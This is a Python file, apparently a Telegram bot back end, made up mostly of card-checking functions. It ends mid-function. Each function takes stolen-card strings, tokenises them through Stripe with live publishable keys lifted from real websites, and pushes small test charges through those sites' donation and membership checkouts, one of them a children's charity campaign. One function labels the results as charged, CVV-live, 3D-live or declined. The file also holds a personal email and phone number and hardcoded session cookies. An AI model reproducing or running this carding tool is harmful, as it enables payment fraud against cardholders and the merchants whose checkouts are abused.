import os,sys
import random
import telebot
import requests,random,time,string,base64
from bs4 import BeautifulSoup
import os,json
import base64
from telebot import types
import time,requests
from re import findall
import user_agent

import re

import requests
import re,json
import random
import time
import string
import base64
from bs4 import BeautifulSoup



import random
import string
import threading
import time

import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&billing_details[name]=Chit+Nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=83b29f01-1318-4991-b19a-22576f2a7f2e301761&pasted_fields=number&payment_user_agent=stripe.js%2Fd49e1820d7%3B+stripe-js-v3%2Fd49e1820d7%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=51643&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '_ga': 'GA1.1.1027315439.1730043864',
            '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
            'charitable_session': 'fd4288d243141cb09e7483895346b34a||86400||82800',
            '_ga_M3WG7TPY0P': 'GS1.1.1731482913.36.1.1731483058.0.0.0',
            '_ga_9S894YGECP': 'GS1.1.1731482913.36.1.1731483061.0.0.0',
            '__stripe_sid': '83b29f01-1318-4991-b19a-22576f2a7f2e301761',
	}

	headers = {
            'authority': 'needhelped.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=fd4288d243141cb09e7483895346b34a||86400||82800; _ga_M3WG7TPY0P=GS1.1.1731482913.36.1.1731483058.0.0.0; _ga_9S894YGECP=GS1.1.1731482913.36.1.1731483061.0.0.0; __stripe_sid=83b29f01-1318-4991-b19a-22576f2a7f2e301761',
            'origin': 'https://needhelped.com',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}


	data = {
            'charitable_form_id': '673455249b542',
            '673455249b542': '',
            '_charitable_donation_nonce': '1973a14e3e',
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '87194',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Chit',
            'last_name': 'Nge',
            'email': 'saimyataungcr8@gmail.com',
            'address': 'New York',
            'address_2': '',
            'city': 'New York ',
            'state': 'New York',
            'postcode': '10080',
            'country': 'US',
            'phone': '15025659429',
            'gateway': 'stripe',
            'stripe_payment_method': pm,
            'action': 'make_donation',
            'form_action': 'make_donation',
	}
	
	r2 = requests.post(
			'https://needhelped.com/wp-admin/admin-ajax.php',
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank You'
	return ii




import requests,re
def Tele2(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&billing_details[name]=Chit+Nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=83b29f01-1318-4991-b19a-22576f2a7f2e301761&pasted_fields=number&payment_user_agent=stripe.js%2Fd49e1820d7%3B+stripe-js-v3%2Fd49e1820d7%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=51643&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '_ga': 'GA1.1.1027315439.1730043864',
            '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
            'charitable_session': 'fd4288d243141cb09e7483895346b34a||86400||82800',
            '_ga_M3WG7TPY0P': 'GS1.1.1731482913.36.1.1731483058.0.0.0',
            '_ga_9S894YGECP': 'GS1.1.1731482913.36.1.1731483061.0.0.0',
            '__stripe_sid': '83b29f01-1318-4991-b19a-22576f2a7f2e301761',
	}

	headers = {
            'authority': 'needhelped.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=fd4288d243141cb09e7483895346b34a||86400||82800; _ga_M3WG7TPY0P=GS1.1.1731482913.36.1.1731483058.0.0.0; _ga_9S894YGECP=GS1.1.1731482913.36.1.1731483061.0.0.0; __stripe_sid=83b29f01-1318-4991-b19a-22576f2a7f2e301761',
            'origin': 'https://needhelped.com',
            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}


	data = {
            'charitable_form_id': '673455249b542',
            '673455249b542': '',
            '_charitable_donation_nonce': '1973a14e3e',
            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
            'campaign_id': '1164',
            'description': 'Poor Children Donation Support',
            'ID': '87194',
            'donation_amount': 'custom',
            'custom_donation_amount': '1.00',
            'first_name': 'Chit',
            'last_name': 'Nge',
            'email': 'saimyataungcr8@gmail.com',
            'address': 'New York',
            'address_2': '',
            'city': 'New York ',
            'state': 'New York',
            'postcode': '10080',
            'country': 'US',
            'phone': '15025659429',
            'gateway': 'stripe',
            'stripe_payment_method': pm,
            'action': 'make_donation',
            'form_action': 'make_donation',
	}
	
	r2 = requests.post(
			'https://needhelped.com/wp-admin/admin-ajax.php',
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank You'
	return ii




	
	
	
	
import requests

def Tele3(ccx):
    # Strip any extra spaces
    ccx = ccx.strip()

    try:
        # Split the card details into number, month, year, and CVC
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
    except IndexError:
        print(f"Error: The input string {ccx} is not in the correct format.")
        return

    # Shorten year if necessary (e.g., '2028' becomes '28')
    if "20" in yy:
        yy = yy.split("20")[1]

    # Create a session

    # Example headers (customize as needed)
    headers = {
        'authority': 'chkr.cc',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_clck=1nznmx5%7C2%7Cfqj%7C0%7C1767; _clsk=1y8plkh%7C1730567385506%7C1%7C1%7Cn.clarity.ms%2Fcollect',
        'origin': 'https://chkr.cc',
        'referer': 'https://chkr.cc/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # Example data payload (customize as needed)
    data = {
         'data':  f'{n}|{mm}|20{yy}|{cvc}',
         'key': '',
    }


    # Make an API request (using a legitimate API, not the one you're working with)
    # This is just a placeholder for a legitimate use case, e.g., Stripe API or any other
    response = requests.post('https://chkr.cc/api.php', headers=headers, data=data).json()
    try:
    	ii=response['msg']
    except:
    	return 'Live' or 'Thank You'
    return ii
	
	
import requests,re
def Tele9(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=533bf720-b3ae-4db5-b780-a21794a9169e55cce1&sid=3e3d1806-ebef-4d90-a732-e1af46a6dab0ba3df3&payment_user_agent=stripe.js%2F647211f3a5%3B+stripe-js-v3%2F647211f3a5%3B+card-element&referrer=https%3A%2F%2Fkittyhawk.academy&time_on_page=133459&key=pk_live_51Q8kzIRtkDkj1jFU7kJCU9ICe12NnYFvukCggtwOMxOVdXOowy84cRiPF9KIUb7bUozCSm4L5j9Bd0nM2XURgT4u00rle6aYVl'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '_ga_MGS3WFSV98': 'GS1.1.1730315870.1.0.1730315870.0.0.0',
            '_ga': 'GA1.1.1309974513.1730315870',
            '__stripe_mid': '533bf720-b3ae-4db5-b780-a21794a9169e55cce1',
            '__stripe_sid': '3e3d1806-ebef-4d90-a732-e1af46a6dab0ba3df3',
	}

	headers = {
            'authority': 'kittyhawk.academy',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga_MGS3WFSV98=GS1.1.1730315870.1.0.1730315870.0.0.0; _ga=GA1.1.1309974513.1730315870; __stripe_mid=533bf720-b3ae-4db5-b780-a21794a9169e55cce1; __stripe_sid=3e3d1806-ebef-4d90-a732-e1af46a6dab0ba3df3',
            'origin': 'https://kittyhawk.academy',
            'referer': 'https://kittyhawk.academy/membership/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1730316010174',
	}

	data = {
            'data': '__fluent_form_embded_post_id=32&_fluentform_4_fluentformnonce=d94a295060&_wp_http_referer=%2Fmembership%2F&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&phone=%2B12015858673&email=saimyataungcr8%40gmail.com&address_1%5Baddress_line_1%5D=New%20York&address_1%5Baddress_line_2%5D=Gg&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&input_text=Tgg&datetime_1=26-Oct-24&input_text_1=&datetime_2=&input_text_2=&checkbox_4%5B%5D=MEP&datetime_4=&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&email_1=saimyataungcr8%40gmail.com&phone_1=%2B12018686856&payment_input_1=1&payment_method=stripe&__entry_intermediate_hash=a4846220a0d80f52e8711cc09e6dba8a&checkbox_2%5B%5D=&checkbox_5%5B%5D=&checkbox_6%5B%5D=&checkbox_9%5B%5D=&checkbox_7%5B%5D=&checkbox_8%5B%5D=&checkbox_10%5B%5D=&checkbox_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
    'form_id': '4',
	}
	
	r2 = requests.post(
			'https://kittyhawk.academy/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Your card does not support this type of purchase'
	return ii
	
from requests import Session as s
from random import randint as ran
from random import choices as cho
from faker import Faker
faker = Faker()
s().follow_redirects = True
s().verify = False

def typ(cc):
    cc = str(cc)
    cc = cc[0]
    if cc == "3":
        card_type = "amex"
    elif cc == "4":
        card_type = "visa"
    elif cc == "5":
        card_type = "mastercard"
    elif cc == "6":
        card_type = "discover"
    else:
        card_type = "Unknown"
    return card_type
    

def Tele4(cc):
    try:
        num, mon, yer, cvv = map(str.strip, cc.split("|"))
        name = faker.first_name().upper()
        email = name + ''.join(cho("qwertyuiopasdfghjklzxcvbnm123456789", k=10)) + "@gmail.com"
        
        url = "https://api.stripe.com/v1/payment_methods"
        data = {
"type":"card",
"billing_details[address][line1]":"",
"billing_details[address][line2]":"",
"billing_details[address][city]":"",
"billing_details[address][state]":"",
"billing_details[address][postal_code]":"10080",
"billing_details[address][country]":"US",
"billing_details[name]":name,
"card[number]":num,
"card[cvc]":cvv,
"card[exp_month]":mon,
"card[exp_year]":f"{yer if len(yer)==2 else yer[2:]}",
"guid":"NA",
"muid":"NA",
"sid":"NA",
"pasted_fields":"number",
"payment_user_agent":"stripe.js%2F088e2e9be8%3B+stripe-js-v3%2F088e2e9be8%3B+split-card-element",
"referrer":"https%3A%2F%2Fvisegradinsight.eu",
"time_on_page":"168984",
"key":"pk_live_51HUqhxLeEmKrqQJR77B80B22wogbwGcRMmqAH3Y4ERXdmsKWFGJOJI9ycH1rIVBzH1ZGG5Zkfkjw7M3DdZtqGDAe00a9laqj2v"
        }
        headers = {
            "authority": "api.stripe.com",
            "method": "POST",
            "path": "/v1/payment_methods",
            "scheme": "https",
            "accept": "application/json",
            "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referrer": "https://js.stripe.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36"
        }
        response = s().post(url, headers=headers, data=data).json()
        id = response["id"]
        
        if not id:
            return f"Card: {cc} - Error: Unable to create payment method."
        
        url = "https://visegradinsight.eu/membership-account/membership-checkout/"
        data = {
    'level': '3',
    'checkjavascript': '1',
    'other_discount_code': '',
    'discount_code': '',
    'username': '',
    'bfirstname': name,
    'blastname': name,
    'bemail': email,
    'password': 'Op@88888',
    'password2': 'Op@88888',
    'bconfirmemail_copy': '1',
    'fullname': '',
    'baddress1': '',
    'baddress2': '',
    'bcity': '',
    'bstate': '',
    'bphone': '',
    'vat_number': '',
    'bzipcode': '10080',
    'bcountry': 'US',
    'CardType': typ(num),
    'submit-checkout': '1',
    'javascriptok': '1',
    'apbct_visible_fields': '{"0":{"visible_fields":"other_discount_code other_discount_code_button discount_code discount_code_button username bfirstname blastname bemail password password2 fullname baddress1 baddress2 bcity bstate bphone vat_number bzipcode bcountry","visible_fields_count":19,"invisible_fields":"level checkjavascript bconfirmemail_copy CardType submit-checkout javascriptok","invisible_fields_count":6}}',
    'payment_method_id': id,
    'AccountNumber': f'XXXXXXXXXXXX{num[12:]}',
    'ExpirationMonth': '03',
    'ExpirationYear': f'{yer if len(yer)==4 else str(20)+yer}',
}
        
        headers = {
    'authority': 'visegradinsight.eu',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://visegradinsight.eu',
    'pragma': 'no-cache',
    'referer': 'https://visegradinsight.eu/membership-account/membership-checkout/?level=3',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}

        params = {
		    'level': '3',
		    }
    
        response = s().post(url, headers=headers,params=params,data=data).text.lower()
        with open("test.html","w") as f:
            f.write(response) 
        
        if any(msg in response for msg in ["succeeded","payment-success","successfully","thank you for your support","insufficient funds","insufficient_funds","payment-successfully","your card does not support this type of purchase","thank you","membership confirmation","/wishlist-member/?reg=","thank you for your payment","thank you for membership","payment received","your order has been received","purchase successful","your card is not supported"]):
               with open("charged.html","w") as f:
                   f.write(response)
               msg = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗💰"
               
        elif any(msg in response for msg in ["incorrect_cvc","invalid cvc","invalid_cvc","incorrect cvc","incorrect cvv","incorrect_cvv","invalid_cvv","invalid cvv",'"cvv_check":"pass"',"cvv_check: pass","security code is invalid","security code is incorrect","zip code is incorrect","zip code is invalid","card is declined by your bank","lost_card","stolen_card","transaction_not_allowed","pickup_card"]):
               with open("CCN-CVV.html","w") as f:
                   f.write(response)
               msg = "𝗖𝗖𝗡/𝗖𝗩𝗩"
               
        elif any(msg in response for msg in ["authentication required","three_d_secure","3d secure","stripe_3ds2_fingerprint"]):
               with open("3D LIVE.html","w") as f:
                   f.write(response)
               msg = "𝟯𝗗 𝗟𝗜𝗩𝗘 💰"
               
        elif any(msg in response for msg in ["declined","do_not_honor","generic_decline","decline by your bank","expired_card","your card has expired","incorrect_number","card number is incorrect","processing_error","service_not_allowed","lock_timeout","card was declined","fraudulent"]):
               msg = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
               
        else:
               msg = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗[𝗨𝗡𝗞𝗡𝗢𝗪𝗡]🥺"
               
        return msg
    
    except Exception as e:
        return str(e)
        	
	



import requests,re
def Tele7(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=b795a209-45f1-435e-b874-ea306ab190893f5df6&sid=7f450269-c474-451b-818e-23cfb9a4ab592fd69b&payment_user_agent=stripe.js%2F08a843aa09%3B+stripe-js-v3%2F08a843aa09%3B+card-element&referrer=https%3A%2F%2Fhongkongscottish.com&time_on_page=60871&key=pk_live_51F4OGoCvgJYtiJpDUFknw4fFGOsFREy2evbK8vIpfazPKQI7v96SBhLfoJLGe3t9I2mSDY80IRhxK3oZDMuo1X2f00YxU1632R'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            'mailchimp_landing_site': 'https%3A%2F%2Fhongkongscottish.com%2Fsocial-membership%2F',
            '_ga': 'GA1.2.877774477.1730180364',
            'tk_or': '%22%22',
            'tk_r3d': '%22%22',
            'tk_lr': '%22%22',
            '__stripe_mid': 'b795a209-45f1-435e-b874-ea306ab190893f5df6',
            '_gid': 'GA1.2.709542826.1730310312',
            '__stripe_sid': '7f450269-c474-451b-818e-23cfb9a4ab592fd69b',
	}

	headers = {
            'authority': 'hongkongscottish.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fhongkongscottish.com%2Fsocial-membership%2F; _ga=GA1.2.877774477.1730180364; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; __stripe_mid=b795a209-45f1-435e-b874-ea306ab190893f5df6; _gid=GA1.2.709542826.1730310312; __stripe_sid=7f450269-c474-451b-818e-23cfb9a4ab592fd69b',
            'origin': 'https://hongkongscottish.com',
            'referer': 'https://hongkongscottish.com/social-membership/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}
	params = {
			't': '1730310374954',
	}

	data = "data=ak_hp_textarea%3D%26ak_js%3D1730310308456%26__fluent_form_embded_post_id%3D42720%26_fluentform_14_fluentformnonce%3Db7633b5c51%26_wp_http_referer%3D%252Fsocial-membership%252F%26names%255Bfirst_name%255D%3DChit%26names%255Blast_name%255D%3DNge%26input_text_1%3DFytd%26email%3Dsaimyataungcr8%2540gmail.com%26phone%3D%252B12015646555%26input_radio_3%3DMale%26datetime%3D21%252F10%252F2000%26input_radio%3Dyes%26address_1%255Baddress_line_1%255D%3DNew%2520York%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%2520%26address_1%255Bstate%255D%3DNew%2520York%26address_1%255Bzip%255D%3D10080%26address_1%255Bcountry%255D%3DUS%26checkbox_1%255B%255D%3DI%2520agree%2520with%2520the%2520terms%2520of%2520Hong%2520Kong%2520Scottish's%2520%253Ca%2520href%253D%2522https%253A%252F%252Fhongkongscottish.com%252Fwp-content%252Fuploads%252F2019%252F08%252FWebsite-Privacy-Policy.pdf%2522%253EPrivacy%2520Policy%2520%253C%252Fa%253E%2520*%26checkbox_3%255B%255D%3DIn%2520registering%2520for%2520membership%2520for%2520the%2520season%25202024%252F25%252C%2520I%2520understand%2520and%2520accept%2520that%2520membership%2520fees%2520paid%2520are%2520non-refundable%26payment_method%3Dstripe%26payment_input%3D900%26__stripe_payment_method_id%3Dpm_1QFfyECvgJYtiJpDIelHdCO0&action=fluentform_submit&form_id=14"
	
	
	r2 = requests.post(
			'https://hongkongscottish.com/wp-admin/admin-ajax.php',
			cookies=cookies,
			params=params,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank You'
	return ii
	




import requests,re
def Tele8(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7c968580-922b-477b-a253-afa52ce568d5a17b60&sid=f86cb3ae-c054-4ec1-bbfa-b0bc525cc46fd34c12&payment_user_agent=stripe.js%2F647211f3a5%3B+stripe-js-v3%2F647211f3a5%3B+card-element&referrer=https%3A%2F%2Fkeithblakemorenoble.com&time_on_page=42540&key=pk_live_5163VlICVbQePYwnHpC6xQ1wAMi4pO6D6eY2ym3GnZBDInghXWVwsAjN800a1WNhj3KT6isbRTsuSUT0in9jGKMTu00vYpYIGp4'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            'cmplz_saved_categories': '["no_warning"]',
            'cmplz_saved_services': '{}',
            'cmplz_consented_services': '',
            'cmplz_policy_id': '38',
            'cmplz_marketing': 'allow',
            'cmplz_statistics': 'allow',
            'cmplz_preferences': 'allow',
            'cmplz_functional': 'allow',
            'cmplz_id': '91093',
            '__stripe_mid': '7c968580-922b-477b-a253-afa52ce568d5a17b60',
            '__stripe_sid': 'f86cb3ae-c054-4ec1-bbfa-b0bc525cc46fd34c12',
	}

	headers = {
            'authority': 'keithblakemorenoble.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': 'cmplz_saved_categories=["no_warning"]; cmplz_saved_services={}; cmplz_consented_services=; cmplz_policy_id=38; cmplz_marketing=allow; cmplz_statistics=allow; cmplz_preferences=allow; cmplz_functional=allow; cmplz_id=91093; __stripe_mid=7c968580-922b-477b-a253-afa52ce568d5a17b60; __stripe_sid=f86cb3ae-c054-4ec1-bbfa-b0bc525cc46fd34c12',
            'origin': 'https://keithblakemorenoble.com',
            'referer': 'https://keithblakemorenoble.com/shop/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
